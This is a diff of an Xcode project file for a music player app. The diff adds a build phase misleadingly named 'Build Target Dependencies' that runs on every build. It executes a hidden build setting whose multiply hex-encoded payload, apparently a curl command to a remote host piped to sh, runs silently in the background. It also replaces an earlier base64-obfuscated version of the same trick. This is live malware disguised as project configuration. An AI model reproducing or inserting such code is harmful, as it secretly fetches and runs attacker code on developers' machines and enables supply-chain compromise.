@@ -7,12 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		78864002257043DFBFFD9BF4 /* README.md */ = {isa = PBXBuildFile; fileRef = 28CE403E153A64E2CBFD9BF4; };
 		88BFFB4B2DC880690099CE75 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 88BFFB4A2DC880690099CE75 /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		28CE403E153A64E2CBFD9BF4 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "MusicPlayerApp.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		883BF3A32DC356F600B2FDC3 /* MusicPlayerApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MusicPlayerApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		88BFFB4A2DC880690099CE75 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -54,7 +52,6 @@
 		883BF3A42DC356F600B2FDC3 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				28CE403E153A64E2CBFD9BF4 /* README.md */,
 				883BF3A32DC356F600B2FDC3 /* MusicPlayerApp.app */,
 			);
 			name = Products;
@@ -67,12 +64,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 883BF3B12DC356FA00B2FDC3 /* Build configuration list for PBXNativeTarget "MusicPlayerApp" */;
 			buildPhases = (
+				DBADE85972D900EA63FD9BF4 /* Build Target Dependencies */,
 				883BF39F2DC356F600B2FDC3 /* Sources */,
 				883BF3A02DC356F600B2FDC3 /* Frameworks */,
 				883BF3A12DC356F600B2FDC3 /* Resources */,
 			);
 			buildRules = (
-				9F40E6E4CAD525DC12FD9BF4 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -121,24 +118,35 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXBuildRule section */
-		9F40E6E4CAD525DC12FD9BF4 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A4FB9DF}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		DBADE85972D900EA63FD9BF4 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
+			showEnvVarsInLog = 0;			
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -146,7 +154,6 @@ sh -c \"${A4FB9DF}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				78864002257043DFBFFD9BF4 /* README.md */,
 				88BFFB4B2DC880690099CE75 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -167,7 +174,7 @@ sh -c \"${A4FB9DF}\"";
 		883BF3AF2DC356FA00B2FDC3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmlSMHBJVW01d2ExSXllSEZYYTJNeFpXdDRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363333333633343336363533373332333636363337333533373334333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -231,7 +238,7 @@ sh -c \"${A4FB9DF}\"";
 		883BF3B02DC356FA00B2FDC3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmlSMHBJVW01d2ExSXllSEZYYTJNeFpXdDRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363333333633343336363533373332333636363337333533373334333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
